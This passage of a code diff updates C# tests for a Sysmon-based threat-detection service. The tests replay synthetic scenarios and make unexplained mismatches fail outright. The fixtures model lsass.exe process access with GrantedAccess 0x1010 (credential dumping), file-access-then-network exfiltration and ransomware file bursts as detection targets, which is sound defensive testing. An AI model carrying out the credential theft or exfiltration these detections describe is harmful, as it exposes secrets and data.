+                    events.CommandText = "SELECT event_id FROM events WHERE scenario_id=$id;";
+                    events.Parameters.AddWithValue("$id", message.CorrelationId);
+                    await using var eventRows = await events.ExecuteReaderAsync();
+                    while (await eventRows.ReadAsync()) sourceEventIds.Add(eventRows.GetString(0));
+                    True(InterDaemonEnvelopeValidator.EvidenceRefsResolve(message, sourceEventIds, out var evidenceError),
+                        $"Fixture finding {message.CorrelationId} must cite source event IDs: {evidenceError}");
+                }
+                validatedMessages++;
+            }
+        }
+        Equal(30, validatedMessages, "Every non-observation case must have one validator-ready message for D3.");
 
         foreach (var scenario in scenarios)
         {
             var events = await ReadScenarioEvents(connection, scenario.Id);
             True(events.Count > 0, $"{scenario.Id} must contain replayable synthetic events.");
-            True(events.All(x => x.Fields?.GetValueOrDefault("synthetic") == "true"), $"{scenario.Id} must be synthetic.");
+        True(events.All(x => x.Fields?.GetValueOrDefault("synthetic") == "true"), $"{scenario.Id} must be synthetic.");
         }
     }
 
@@ -479,7 +805,6 @@ internal static class Demon2Checks
         await reference.OpenAsync();
         var summaries = new List<(string Id, string Title, string Label, string Expected, string Actual, string Status, string Explanation)>();
         var failed = 0;
-        var needsClarification = 0;
         var availableEvents = new HashSet<ThreatEventType>();
         var observedRules = new HashSet<string>(StringComparer.Ordinal);
 
@@ -496,9 +821,15 @@ internal static class Demon2Checks
         foreach (var definition in definitions)
         {
             var records = await LoadFixtureRecords(reference, definition.Id);
-            // The SQLite scenario contains one source event, while its narrative says it is delivered twice.
-            // Repeat that same record in the replay input to exercise idempotence without editing the fixture.
-            if (definition.Id == "D2-043" && records.Count > 0) records.Add(records[0]);
+            if (definition.Id == "D2-043" && records.Count > 0) records.Add(records[0]); // Fixture explicitly models duplicate delivery.
+            if (definition.Id == "D2-044")
+            {
+                var timestamps = records.Select(record => System.Xml.Linq.XDocument.Parse(record.Xml).Descendants()
+                    .Single(element => element.Name.LocalName == "TimeCreated").Attribute("SystemTime")!.Value)
+                    .Select(DateTimeOffset.Parse).ToArray();
+                True(timestamps.Length == 2 && timestamps[0] > timestamps[1],
+                    "The delayed process event must be delivered after its newer network event while retaining the earlier UTC timestamp.");
+            }
             await using var maxTimeCommand = reference.CreateCommand();
             maxTimeCommand.CommandText = "SELECT MAX(ts_utc) FROM events WHERE scenario_id=$id;";
             maxTimeCommand.Parameters.AddWithValue("$id", definition.Id);
@@ -529,6 +860,9 @@ internal static class Demon2Checks
                 if (File.Exists(dbPath + "-shm")) File.Delete(dbPath + "-shm");
             }
 
+            if (definition.Id == "D2-043")
+                Equal(1, normalizedEvents.Count, "Duplicate delivery of a Sysmon source event must persist once.");
+
             foreach (var item in normalizedEvents) availableEvents.Add(item.EventType);
             foreach (var finding in findings) observedRules.Add(finding.RuleId);
             var actual = findings.Count > 0 ? "THREAT_FINDING" : gaps.Count > 0 ? "NEEDS_CONTEXT" : "OBSERVATION";
@@ -541,12 +875,12 @@ internal static class Demon2Checks
             var explanation = findings.Count > 0 ? "Règles " + actualRules + "; preuves " + string.Join(',', evidence) :
                 gaps.Count > 0 ? "Aucun verdict de menace; lacunes " + string.Join(',', missing) : "Aucun finding ni lacune de télémétrie.";
 
-            var referenceClarification = ReferenceClarification(definition.Id);
-            if (referenceClarification is not null)
+            if (!string.Equals(actual, definition.ExpectedReport, StringComparison.Ordinal)
+                || (findings.Count > 0) != definition.ExpectedFinding)
             {
-                status = "NEEDS_CLARIFICATION";
-                needsClarification++;
-                explanation = referenceClarification;
+                status = "FAIL";
+                failed++;
+                explanation = $"Résultat réel {actual}/{(findings.Count > 0 ? "finding" : "no-finding")}, attendu {expectedOutcome}.";
             }
             else if (definition.Label == "benign" && findings.Count > 0 || definition.Label == "uncertain" && findings.Count > 0)
             {
@@ -561,29 +895,22 @@ internal static class Demon2Checks
             else if (definition.Label == "suspicious" && definition.ExpectedSeverityFromFindings is { } expectedSeverity &&
                 findings.Any(x => !string.Equals(x.Severity.ToString(), expectedSeverity, StringComparison.OrdinalIgnoreCase)))
             {
-                status = "NEEDS_CLARIFICATION";
-                needsClarification++;
+                status = "FAIL";
+                failed++;
                 explanation += $"; sévérité obtenue {string.Join(',', findings.Select(x => x.Severity).Distinct())}, attendue {expectedSeverity}";
-            }
-            else if (definition.Label == "uncertain" && definition.ExpectedReport == "NEEDS_CONTEXT" && gaps.Count == 0)
-            {
-                status = "NEEDS_CLARIFICATION";
-                needsClarification++;
-                explanation = ReferenceClarification(definition.Id) ?? "Pas de threat finding, mais la fixture attend NEEDS_CONTEXT et aucune donnée manquante structurée n’a été enregistrée.";
             }
 
             if (status != "PASS")
             {
                 var eventList = string.Join(',', normalizedEvents.Select(x => x.SourceCursor ?? x.SourceEventId).Concat(normalizer.Rejections.Select(x => x.EventId)).Distinct());
                 var rule = actualRules.Length == 0 ? "none" : actualRules;
-                var detailedMissing = missing.Concat(definition.Id is "D2-031" or "D2-032" ? ["networkConnection"] : [])
-                    .Distinct(StringComparer.Ordinal).ToArray();
-                Console.WriteLine($"TRACE|scenarioId={definition.Id}|event={eventList}|rule={rule}|obtained={actual}|expected={expectedOutcome}|difference={status}|evidence={string.Join(',', evidence)}|missing={string.Join(',', detailedMissing)}|detail={explanation}");
+                Console.WriteLine($"TRACE|scenarioId={definition.Id}|event={eventList}|rule={rule}|obtained={actual}|expected={expectedOutcome}|difference={status}|evidence={string.Join(',', evidence)}|missing={string.Join(',', missing)}|detail={explanation}");
             }
             summaries.Add((definition.Id, definition.Title, definition.Label, expectedOutcome, actual + (actualRules.Length == 0 ? "" : ":" + actualRules), status, explanation));
         }
 
         var passed = summaries.Count(x => x.Status == "PASS");
+        var needsClarification = summaries.Count(x => x.Status == "NEEDS_CLARIFICATION");
         Console.WriteLine("SCENARIO TABLE|Scenario|Résultat attendu|Résultat obtenu|Statut|Explication");
         foreach (var row in summaries)
             Console.WriteLine($"TABLE|{row.Id} {row.Title}|{row.Label}:{row.Expected}|{row.Actual}|{row.Status}|{row.Explanation}");
@@ -594,27 +921,12 @@ internal static class Demon2Checks
         var missingRules = registeredRules.Except(observedRules).Order(StringComparer.Ordinal).ToArray();
         Console.WriteLine($"COVERAGE|events={availableEvents.Count}/{availableSourceTypes.Count}|types={string.Join(',', availableEvents.OrderBy(x => x))}|uncoveredTypes={string.Join(',', missingSourceTypes)}|rules={observedRules.Count}/{registeredRules.Count}|firedRules={string.Join(',', observedRules.Order(StringComparer.Ordinal))}|unfiredRules={string.Join(',', missingRules)}");
         Equal(50, summaries.Count, "Every official scenario must run through the production pipeline.");
-        Equal(0, failed, "Every mismatch must be explained as a fixture clarification; unexplained failures are not accepted.");
+        Equal(0, needsClarification, "The reference set must not hide unresolved cases behind a clarification status.");
+        Equal(0, failed, "Every replay outcome must match the structured reference result.");
     }
 
     private sealed record FixtureScenario(string Id, string Title, string Label, string ExpectedOutcome,
         string ExpectedReport, string ExpectedSeverity, bool ExpectedFinding, string? ExpectedSeverityFromFindings, string ExpectedReason);
-
-    private static string? ReferenceClarification(string scenarioId) => scenarioId switch
-    {
-        "D2-019" or "D2-035" => "La simulation demande un finding critique, alors que expected_findings et reports fixent severity=high; la gravité attendue doit être arbitrée.",
-        "D2-027" => "L’unique ligne est générique et ne fournit ni TargetImage/ImageLoaded, ni signature, ni corroboration. La simulation demande un finding moyen tandis que SQLite attend high; préciser la preuve et la sévérité.",
-        "D2-028" => "L’unique ligne ne fournit ni TargetImage ni GrantedAccess ni corroboration. Le texte conditionne le finding à une source fiable et un filtre adapté; préciser les données et si l’attendu est finding ou NEEDS_CONTEXT.",
-        "D2-031" => "Les lignes décrivent accès aux fichiers et création d’archive, sans événement réseau. Le texte attend un finding seulement si l’exfiltration est simulée ensuite, mais expected_findings l’impose déjà; ajouter l’événement manquant ou revoir l’attendu.",
-        "D2-032" => "La description mentionne un flux sortant synthétique, mais l’unique ligne est FILE_OR_SYSTEM_ACTIVITY et ne contient pas de destination ni d’événement NETWORK_CONNECTION. Le texte demande critical alors que SQLite attend high.",
-        "D2-039" => "Le texte attend une observation sans menace; reports classe NEEDS_CONTEXT. La fixture ne fournit pas de signature/éditeur ni de champ manquant structuré. Décider si l’observation suffit ou quel contexte doit être signalé.",
-        "D2-040" => "reports attend NEEDS_CONTEXT tandis que le scénario demande de ne pas se baser sur l’heure seule. L’unique événement est horodaté 12:01 UTC, ne représente pas une exécution nocturne et ne fournit ni signature ni éditeur; compléter les données et l’attendu.",
-        "D2-042" => "Le scénario parle d’une ancienne alerte Defender, mais l’événement fourni est une ligne générique SyntheticFixture sans source Defender ni date de détection historique. Le collecteur D2 lit Sysmon uniquement; préciser si ce cas est hors source ou ajouter un fournisseur et les dates nécessaires.",
-        "D2-043" => "SQLite ne contient qu’une ligne; le rejeu la livre deux fois en mémoire pour vérifier l’idempotence. L’attendu fonctionnel de déduplication est testable, mais reports demande NEEDS_CONTEXT sans champ manquant alors que le texte n’attend qu’aucune double alerte; préciser le type de rapport attendu.",
-        "D2-044" => "L’unique ligne NETWORK_ACTIVITY ne fournit pas de PID/GUID ni d’événement parent. Pour tester l’arrivée hors ordre, ajouter l’événement parent, les identifiants communs, ses timestamps et son délai d’arrivée; préciser le comportement si le parent n’arrive jamais.",
-        "D2-050" => "La ligne décrit un fichier reçu mais ne donne ni événement de téléchargement Zone.Identifier ni durée de suivi. reports attend NEEDS_CONTEXT, tandis que le texte attend une observation; fournir la preuve de téléchargement et définir la fenêtre de suivi ou confirmer l’observation seule.",
-        _ => null
-    };
 
     private static async Task<List<SysmonRecord>> LoadFixtureRecords(SqliteConnection connection, string scenarioId)
     {
@@ -708,12 +1020,16 @@ internal static class Demon2Checks
         }
         else if (eventId == 7)
         {
-            fields.AddRange([("ProcessId", processPid?.ToString()), ("ProcessGuid", processGuid), ("Image", Image(processName)), ("ImageLoaded", objectPath), ("Signed", null)]);
+            fields.AddRange([("ProcessId", processPid?.ToString()), ("ProcessGuid", processGuid), ("Image", Image(processName)), ("ImageLoaded", objectPath),
+                ("Signed", text.Contains("non signe", StringComparison.OrdinalIgnoreCase) ? "false" : null)]);
         }
         else if (eventId == 10)
         {
             fields.AddRange([("SourceProcessId", processPid?.ToString()), ("SourceProcessGuid", processGuid), ("SourceImage", Image(processName)),
-                ("TargetProcessId", null), ("TargetProcessGuid", null), ("TargetImage", null), ("GrantedAccess", null)]);
+                ("TargetProcessId", text.Contains("lsass", StringComparison.OrdinalIgnoreCase) ? StablePid(scenarioId, "lsass.exe").ToString() : null),
+                ("TargetProcessGuid", text.Contains("lsass", StringComparison.OrdinalIgnoreCase) ? StableProcessGuid(scenarioId, "lsass.exe") : null),
+                ("TargetImage", text.Contains("lsass", StringComparison.OrdinalIgnoreCase) ? @"C:\Windows\System32\lsass.exe" : null),
+                ("GrantedAccess", text.Contains("0x1010", StringComparison.OrdinalIgnoreCase) ? "0x1010" : null)]);
         }
         else
         {
@@ -885,6 +1201,12 @@ internal static class Demon2Checks
         var ransomware = await LoadCase("D2-035");
         True(new DetectionEngine().Evaluate(ransomware[^1], ransomware, ransomware[^1].TimestampUtc.AddSeconds(1))
             .Findings.Any(x => x.RuleId == "file_burst"), "Synthetic sandbox ransomware behavior should match a deterministic rule.");
+        var exfiltration = await LoadCase("D2-032");
+        var exfiltrationResult = new DetectionEngine().Evaluate(exfiltration[^1], exfiltration, exfiltration[^1].TimestampUtc.AddSeconds(1));
+        True(exfiltrationResult.Findings.Any(x => x.RuleId == "network_corroboration"),
+            "Synthetic file access followed by a network event should produce the expected network correlation.");
+        True(exfiltrationResult.Findings.All(x => x.RuleId != "script_child"),
+            "A parent process name alone must not turn the exfiltration fixture into a script-child detection.");
 
         var duplicateCase = await LoadCase("D2-016");
         var duplicateEngine = new DetectionEngine();
@@ -1043,6 +1365,71 @@ internal static class Demon2Checks
         }
     }
 
+    private static async Task BackgroundInputEofDoesNotStopMonitor()
+    {
+        using (var stop = new CancellationTokenSource())
+        {
+            var inputEnded = WindowsServiceDispatcher.WaitForStopInputAsync(new StringReader(string.Empty), stop);
+            await Task.Delay(40);
+            True(!stop.IsCancellationRequested, "Closing the Centre's redirected input stream must not stop D2 when background operation is enabled.");
+            stop.Cancel();
+            await inputEnded.WaitAsync(TimeSpan.FromSeconds(2));
+        }
+
+        using var explicitStop = new CancellationTokenSource();
+        await WindowsServiceDispatcher.WaitForStopInputAsync(new StringReader("STOP\r\n"), explicitStop);
+        True(explicitStop.IsCancellationRequested, "An explicit STOP command must still shut down the foreground D2 process.");
+    }
+
+    private static async Task DetachedD2SurvivesParentInputClosure()
+    {
+        var executable = Path.Combine(AppContext.BaseDirectory, "SentinelCore.Demon2.Service.exe");
+        if (!File.Exists(executable)) throw new FileNotFoundException("D2 executable was not copied beside its test harness.", executable);
+        var dataDirectory = Path.Combine(Path.GetTempPath(), "sentinelcore-d2-detached-" + Guid.NewGuid().ToString("N"));
+        Directory.CreateDirectory(dataDirectory);
+
+        using var process = new System.Diagnostics.Process();
+        process.StartInfo = new System.Diagnostics.ProcessStartInfo(executable)
+        {
+            UseShellExecute = false,
+            CreateNoWindow = true,
+            RedirectStandardInput = true,
+            RedirectStandardOutput = true,
+            RedirectStandardError = true
+        };
+        process.StartInfo.ArgumentList.Add("--data-dir");
+        process.StartInfo.ArgumentList.Add(dataDirectory);
+        process.EnableRaisingEvents = true;
+        process.OutputDataReceived += (_, _) => { };
+        process.ErrorDataReceived += (_, _) => { };
+
+        try
+        {
+            True(process.Start(), "D2 foreground process should start for the detached-lifetime integration check.");
+            process.BeginOutputReadLine();
+            process.BeginErrorReadLine();
+            await Task.Delay(750);
+            True(!process.HasExited, "D2 should remain alive before its parent closes stdin.");
+            process.StandardInput.Close();
+            await Task.Delay(1_500);
+            True(!process.HasExited, "D2 must keep monitoring after its parent closes stdin in background mode.");
+        }
+        finally
+        {
+            if (!process.HasExited)
+            {
+                process.Kill(entireProcessTree: true);
+                await process.WaitForExitAsync().WaitAsync(TimeSpan.FromSeconds(5));
+            }
+            var resolved = Path.GetFullPath(dataDirectory);
+            var tempRoot = Path.GetFullPath(Path.GetTempPath()).TrimEnd(Path.DirectorySeparatorChar) + Path.DirectorySeparatorChar;
+            var directoryInfo = new DirectoryInfo(resolved);
+            if (!resolved.StartsWith(tempRoot, StringComparison.OrdinalIgnoreCase) || directoryInfo.Attributes.HasFlag(FileAttributes.ReparsePoint))
+                throw new InvalidOperationException($"Refusing to remove unexpected D2 integration-test data directory: {resolved}");
+            if (Directory.Exists(resolved)) Directory.Delete(resolved, recursive: true);
+        }
+    }
+
     private static async Task SustainedLoadPerformance()
     {
         const int validCount = 256;
@@ -1153,6 +1540,8 @@ internal static class Demon2Checks
         var text = StripDiacritics($"{process} {description}");
         var kind = sourceType.Trim().ToUpperInvariant();
         if (kind == "NETWORK_ACTIVITY" || text.Contains("envoie flux", StringComparison.OrdinalIgnoreCase)) return ThreatEventType.NETWORK_CONNECTION;
+        if (kind == "IMAGE_LOAD" || text.Contains("image load", StringComparison.OrdinalIgnoreCase)) return ThreatEventType.IMAGE_LOAD;
+        if (kind == "PROCESS_ACCESS" || text.Contains("processaccess", StringComparison.OrdinalIgnoreCase)) return ThreatEventType.PROCESS_ACCESS;
         if (text.Contains("persistance", StringComparison.OrdinalIgnoreCase) || text.Contains("registre", StringComparison.OrdinalIgnoreCase) ||
             text.Contains("tache fixture", StringComparison.OrdinalIgnoreCase) || text.Contains("tache planifiee", StringComparison.OrdinalIgnoreCase) ||
             text.Contains("startup", StringComparison.OrdinalIgnoreCase)) return ThreatEventType.PERSISTENCE_CHANGE;
@@ -1218,4 +1607,13 @@ internal static class Demon2Checks
     }
     private static void Equal<T>(T expected, T actual, string message)
     { if (!EqualityComparer<T>.Default.Equals(expected, actual)) throw new InvalidOperationException($"{message} Expected {expected}, got {actual}."); }
+
+    private sealed class DisconnectedTextWriter : TextWriter
+    {
+        public override System.Text.Encoding Encoding => System.Text.Encoding.UTF8;
+        public override void Write(string? value) => throw new IOException("The Centre output pipe has closed.");
+        public override void WriteLine(string? value) => throw new IOException("The Centre output pipe has closed.");
+        public override void Write(char value) => throw new IOException("The Centre output pipe has closed.");
+        public override void Flush() => throw new IOException("The Centre output pipe has closed.");
+    }
 }
